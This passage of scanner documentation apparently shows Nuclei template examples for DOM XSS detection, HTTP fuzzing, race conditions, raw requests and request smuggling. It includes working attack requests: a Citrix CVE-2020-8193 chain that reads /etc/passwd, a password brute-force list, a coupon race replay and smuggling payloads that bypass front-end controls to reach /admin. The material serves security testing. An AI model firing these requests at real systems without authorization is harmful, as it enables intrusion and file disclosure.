Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set; Object.defineProperty(Element.prototype, 'innerHTML', { set: function innerHTML_Setter(val) { if (val.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'innerHTML', source: 'window.name', code: val, stack: getStackTrace()}); } return setter.call(this, val) } }); eval = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'eval' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; document.write = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'document.write' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; })(); - args : url : \"{{BaseURL}}\" action : navigate - action : waitload - action : script name : alerts args : code : \"window.alerts\" matchers : - type : word part : alerts words : - \"sink:\" extractors : - type : kval part : alerts kval : - alerts","title":"DOM XSS Detection"},{"location":"template-examples/http-fuzzing/","text":"HTTP Intruder fuzzing \u00b6 This template makes a defined POST request in RAW format along with in template defined payloads running clusterbomb intruder and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info # HTTP Intruder fuzzing with in template payload support. requests : - payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Available types: sniper, pitchfork and clusterbomb raw : - | POST /?username=\u00a7username\u00a7&paramb=\u00a7password\u00a7 HTTP/1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) Host: {{Hostname}} another_header: {{base64('\u00a7password\u00a7')}} Accept: */* body=test matchers : - type : word words : - \"Test is test matcher text\" Fuzzing multiple requests \u00b6 This template makes a defined POST request in RAW format along with wordlist based payloads running clusterbomb intruder and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : # HTTP Intruder fuzzing wordlist based payload support. - payloads : param_a : payloads/prams.txt param_b : payloads/paths.txt attack : clusterbomb # Available types: sniper, pitchfork and clusterbomb raw : # Request with simple param and header manipulation with DSL functions - | POST /?param_a=\u00a7param_a\u00a7&paramb=\u00a7param_b\u00a7 HTTP/1.1 User-Agent: \u00a7param_a\u00a7 Host: {{Hostname}} another_header: {{base64('\u00a7param_b\u00a7')}} Accept: */* admin=test # Request with body with DSL helper manipulation - | DELETE / HTTP/1.1 User-Agent: nuclei Host: {{Hostname}} {{sha256('\u00a7param_a\u00a7')}} - | PUT / HTTP/1.1 Host: {{Hostname}} {{html_escape('\u00a7param_a\u00a7')}} + {{hex_encode('\u00a7param_b\u00a7'))}} matchers : - type : word words : - \"Test is test matcher text\" Authenticated fuzzing \u00b6 This template makes a subsequent HTTP requests with defined requests maintaining sessions between each requests and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Cookie: session=12312321sdasdsa User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 testing=parameter # Cookie-reuse maintain the session between all request like browser. cookie-reuse : true matchers : - type : word words : - \"Test is test matcher text\" Dynamic variable support \u00b6 This template makes a subsequent HTTP requests maintaining sessions between each requests, dynamically extracting data from one request and reusing them into another request using variable name and checking for string match against response. id : CVE-2020-8193 info : name : Citrix unauthenticated LFI author : pdteam severity : high # Source:- https://github.com/jas502n/CVE-2020-8193 requests : - raw : - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Content-Type: application/xml X-NITRO-USER: xpyZxwy6 X-NITRO-PASS: xWXHUJ56 <appfwprofile><login></login></appfwprofile> - | GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/neo HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/stc HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <appfwprofile><login></login></appfwprofile> - | POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <clipermission></clipermission> cookie-reuse : true # Using cookie-reuse to maintain session between each request, same as browser. extractors : - type : regex name : randkey part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" # Using rand_key as dynamic variable to make use of extractors at run time. matchers : - type : regex regex : - \"root:[x*]:0:0:\" part : body","title":"HTTP Payloads"},{"location":"template-examples/http-fuzzing/#http-intruder-fuzzing","text":"This template makes a defined POST request in RAW format along with in template defined payloads running clusterbomb intruder and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info # HTTP Intruder fuzzing with in template payload support. requests : - payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Available types: sniper, pitchfork and clusterbomb raw : - | POST /?username=\u00a7username\u00a7&paramb=\u00a7password\u00a7 HTTP/1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) Host: {{Hostname}} another_header: {{base64('\u00a7password\u00a7')}} Accept: */* body=test matchers : - type : word words : - \"Test is test matcher text\"","title":"HTTP Intruder fuzzing"},{"location":"template-examples/http-fuzzing/#fuzzing-multiple-requests","text":"This template makes a defined POST request in RAW format along with wordlist based payloads running clusterbomb intruder and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : # HTTP Intruder fuzzing wordlist based payload support. - payloads : param_a : payloads/prams.txt param_b : payloads/paths.txt attack : clusterbomb # Available types: sniper, pitchfork and clusterbomb raw : # Request with simple param and header manipulation with DSL functions - | POST /?param_a=\u00a7param_a\u00a7&paramb=\u00a7param_b\u00a7 HTTP/1.1 User-Agent: \u00a7param_a\u00a7 Host: {{Hostname}} another_header: {{base64('\u00a7param_b\u00a7')}} Accept: */* admin=test # Request with body with DSL helper manipulation - | DELETE / HTTP/1.1 User-Agent: nuclei Host: {{Hostname}} {{sha256('\u00a7param_a\u00a7')}} - | PUT / HTTP/1.1 Host: {{Hostname}} {{html_escape('\u00a7param_a\u00a7')}} + {{hex_encode('\u00a7param_b\u00a7'))}} matchers : - type : word words : - \"Test is test matcher text\"","title":"Fuzzing multiple requests"},{"location":"template-examples/http-fuzzing/#authenticated-fuzzing","text":"This template makes a subsequent HTTP requests with defined requests maintaining sessions between each requests and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Cookie: session=12312321sdasdsa User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 testing=parameter # Cookie-reuse maintain the session between all request like browser. cookie-reuse : true matchers : - type : word words : - \"Test is test matcher text\"","title":"Authenticated fuzzing"},{"location":"template-examples/http-fuzzing/#dynamic-variable-support","text":"This template makes a subsequent HTTP requests maintaining sessions between each requests, dynamically extracting data from one request and reusing them into another request using variable name and checking for string match against response. id : CVE-2020-8193 info : name : Citrix unauthenticated LFI author : pdteam severity : high # Source:- https://github.com/jas502n/CVE-2020-8193 requests : - raw : - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Content-Type: application/xml X-NITRO-USER: xpyZxwy6 X-NITRO-PASS: xWXHUJ56 <appfwprofile><login></login></appfwprofile> - | GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/neo HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | GET /menu/stc HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <appfwprofile><login></login></appfwprofile> - | POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: \u00a7randkey\u00a7 <clipermission></clipermission> cookie-reuse : true # Using cookie-reuse to maintain session between each request, same as browser. extractors : - type : regex name : randkey part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" # Using rand_key as dynamic variable to make use of extractors at run time. matchers : - type : regex regex : - \"root:[x*]:0:0:\" part : body","title":"Dynamic variable support"},{"location":"template-examples/http-race-conditions/","text":"Race condition testing with single POST request. \u00b6 This template makes a defined POST request in RAW format to /coupons endpoint, as the race_count is defined as 10 , this will make 10 requests at same time by holding last bytes for all the requests which sent together for all requests synchronizing the send event. You can also define the matcher as any other template for the expected output which helps to identify if the race condition exploit worked or not. id : race-condition-testing info : name : Race Condition testing author : pdteam severity : info requests : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} Pragma: no-cache Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 Cookie: user_session=42332423342987567896 promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200 Race condition testing with multiple requests. \u00b6 This template makes the defined and multiple POST requests in RAW format with threads sets to 5 , threads can be utilized in race condition templates when multiple requests needs to be sent to exploit the race condition, threads number should be same as the number of you are making with template and not needed if you only making single request. id : race-condition-testing info : name : Race condition testing with multiple requests author : pdteam severity : info requests : - raw : - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads : 5 race : true matchers : - type : status status : - 200","title":"Race Condition"},{"location":"template-examples/http-race-conditions/#race-condition-testing-with-single-post-request","text":"This template makes a defined POST request in RAW format to /coupons endpoint, as the race_count is defined as 10 , this will make 10 requests at same time by holding last bytes for all the requests which sent together for all requests synchronizing the send event. You can also define the matcher as any other template for the expected output which helps to identify if the race condition exploit worked or not. id : race-condition-testing info : name : Race Condition testing author : pdteam severity : info requests : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} Pragma: no-cache Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 Cookie: user_session=42332423342987567896 promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200","title":"Race condition testing with single POST request."},{"location":"template-examples/http-race-conditions/#race-condition-testing-with-multiple-requests","text":"This template makes the defined and multiple POST requests in RAW format with threads sets to 5 , threads can be utilized in race condition templates when multiple requests needs to be sent to exploit the race condition, threads number should be same as the number of you are making with template and not needed if you only making single request. id : race-condition-testing info : name : Race condition testing with multiple requests author : pdteam severity : info requests : - raw : - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads : 5 race : true matchers : - type : status status : - 200","title":"Race condition testing with multiple requests."},{"location":"template-examples/http-raw/","text":"Basic template \u00b6 This template makes GET request to / path in RAW format and checking for string match against response. id : basic-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 matchers : - type : word words : - \"Test is test matcher text\" Multiple RAW request \u00b6 This template makes GET and POST request sequentially in RAW format and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 testing=parameter matchers : - type : word words : - \"Test is test matcher text\"","title":"Raw HTTP"},{"location":"template-examples/http-raw/#basic-template","text":"This template makes GET request to / path in RAW format and checking for string match against response. id : basic-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 matchers : - type : word words : - \"Test is test matcher text\"","title":"Basic template"},{"location":"template-examples/http-raw/#multiple-raw-request","text":"This template makes GET and POST request sequentially in RAW format and checking for string match against response. id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 testing=parameter matchers : - type : word words : - \"Test is test matcher text\"","title":"Multiple RAW request"},{"location":"template-examples/http-smuggling/","text":"Basic CL.TE \u00b6 This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : CL.TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")' Basic TE.CL \u00b6 This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : TE.CL-http-smuggling info : name : HTTP request smuggling, basic TE.CL vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")' Frontend bypass CL.TE \u00b6 This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : smuggling-bypass-front-end-controls-cl-te info : name : HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"/admin/delete?username=carlos\")' Differential responses based CL.TE \u00b6 This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : confirming-cl-te-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a CL.TE vulnerability via differential responses author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X unsafe : true matchers : - type : dsl dsl : - 'status_code==404' Differential responses based TE.CL \u00b6 This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : confirming-te-cl-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a TE.CL vulnerability via differential responses author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'status_code==404'","title":"Unsafe HTTP"},{"location":"template-examples/http-smuggling/#basic-clte","text":"This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : CL.TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")'","title":"Basic CL.TE"},{"location":"template-examples/http-smuggling/#basic-tecl","text":"This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : TE.CL-http-smuggling info : name : HTTP request smuggling, basic TE.CL vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")'","title":"Basic TE.CL"},{"location":"template-examples/http-smuggling/#frontend-bypass-clte","text":"This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : smuggling-bypass-front-end-controls-cl-te info : name : HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"/admin/delete?username=carlos\")'","title":"Frontend bypass CL.TE"},{"location":"template-examples/http-smuggling/#differential-responses-based-clte","text":"This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : confirming-cl-te-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a CL.TE vulnerability via differential responses author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X unsafe : true matchers : - type : dsl dsl : - 'status_code==404'","title":"Differential responses based CL.TE"},{"location":"template-examples/http-smuggling/#differential-responses-based-tecl","text":"This template makes a defined malformed HTTP POST requests using rawhttp library and checking for string match against response. id : confirming-te-cl-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a TE.CL vulnerability via differential responses author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'status_code==404'","title":"Differential responses based TE.CL"},{"location":"template-examples/http/","text":"Basic Template \u00b6 This template requests / path of URL and match string in the resposne. id : basic-example info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers : - type : word words : - \"This is test matcher text\" Multiple matchers \u00b6 This template requests / path of URL and run multiple OR based matchers against response. id : http-multiple-matchers info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" part : header Matchers with conditions \u00b6 This template requests / path of URL and runs two matchers, one with AND conditions with string match in header and another matcher against response body. id : matchers-conditions info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : and part : header - type : word words : - \"PHP\" part : body Multiple matcher conditions \u00b6 This template requests / path of URL and runs two matchers with AND conditions, one with OR conditions with string match in header and another matcher against response body, both condition has to be true in order to match this template. id : multiple-matchers-conditions info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - PHP part : body Custom headers \u00b6 This template requests / path of the URL as GET request with additional custom headers defined in the template. id : custom-headers info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET # Example of sending some headers to the servers headers : X-Client-IP : 127.0.0.1 X-Remote-IP : 127.0.0.1 X-Remote-Addr : 127.0.0.1 X-Forwarded-For : 127.0.0.1 X-Originating-IP : 127.0.0.1 path : - \"{{BaseURL}}/server-status\" matchers : - type : word words : - Apache Server Status - Server Version condition : and POST requests \u00b6 This template makes POST request to /admin endpoint with defined data as body parameter in the template. id : post-request info : name : Test HTTP Template author : pdteam severity : info requests : - method : POST path : - \"{{BaseURL}}/admin\" body : 'admin=test' matchers : - type : word words : - Welcome Admin Time based Matcher \u00b6 This template is example of DSL based duration matcher that returns true when the response time matched the defined duration, in this case 6 or more than 6 seconds. id : time-based-matcher info : name : DSL based response time matcher author : pdteam severity : none requests : - raw : - | GET /slow HTTP/1.1 matchers : - type : dsl dsl : - 'duration>=6'","title":"Base HTTP"},{"location":"template-examples/http/#basic-template","text":"This template requests / path of URL and match string in the resposne. id : basic-example info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers : - type : word words : - \"This is test matcher text\"","title":"Basic Template"},{"location":"template-examples/http/#multiple-matchers","text":"This template requests / path of URL and run multiple OR based matchers against response. id : http-multiple-matchers info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" part : header","title":"Multiple matchers"},{"location":"template-examples/http/#matchers-with-conditions","text":"This template requests / 